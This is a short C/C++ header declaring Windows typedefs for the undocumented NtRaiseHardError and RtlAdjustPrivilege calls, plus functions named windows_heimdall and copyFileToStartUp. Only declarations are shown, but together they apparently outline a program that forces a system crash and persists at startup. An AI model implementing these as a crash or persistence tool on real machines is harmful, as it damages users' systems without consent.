#pragma once

#include <stdlib.h>
#include <string.h>
#include <iostream>

#ifdef __linux__

#include <unistd.h>

#elif _WIN32


#include <winsock2.h>
#include <wlanapi.h>
//#include <wtypes.h>

#include <windows.h>
#include <windef.h>
#include <tchar.h>
#include <shlobj.h>
#include <wchar.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <Shlwapi.h>
#include <shellAPI.h>
#include <string>


// Link with libraries
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib,"Shlwapi.lib")

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

void windows_heimdall();
bool FileExists(std::wstring fileName);
void copyFileToStartUp();

#endif